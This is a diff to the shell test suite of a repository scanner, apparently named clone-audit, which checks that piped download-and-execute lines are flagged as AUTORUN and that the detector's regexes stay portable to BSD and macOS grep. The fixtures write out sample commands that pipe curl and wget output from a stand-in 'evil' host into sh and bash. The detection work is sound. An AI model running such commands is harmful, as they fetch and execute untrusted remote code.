@@ -130,12 +130,21 @@ test_npm_lifecycle() {
 }
 
 test_curl_pipe() {
-    bold "Test: curl|sh flagged AUTORUN"; printf '\n'
+    bold "Test: curl|sh flagged AUTORUN (EOL sh and 'bash -c' forms)"; printf '\n'
     local dir; dir="$(new_dir curlp)"
     printf '#!/bin/sh\ncurl -fsSL https://evil/x | sh\n' > "${dir}/install.sh"
+    printf 'wget -qO- https://evil/y | bash -c "id"\n' > "${dir}/setup.sh"
     run_audit "${dir}"
     assert "exit 2"        "[ ${SCAN_RC} -eq 2 ]"
     assert "flags AUTORUN" "grep -q 'AUTORUN' <<< \"\${SCAN_OUT}\""
+}
+
+test_no_gnu_only_regex() {
+    bold "Test: scanner avoids GNU-only \\b (would break BSD/macOS grep)"; printf '\n'
+    # \b is a GNU extension; BSD/macOS ERE doesn't support it, which would make
+    # the curl|sh detector silently miss matches. Guard against reintroduction.
+    assert "no \\b word-boundary in clone-audit regexes" \
+        "! grep -q '\\\\b' '${REPO_DIR}/bin/clone-audit'"
 }
 
 test_gitattributes_filter() {
@@ -239,6 +248,7 @@ main() {
     test_mcp_command
     test_npm_lifecycle
     test_curl_pipe
+    test_no_gnu_only_regex
     test_gitattributes_filter
     test_idea_runconfigs
     test_git_dir_not_scanned
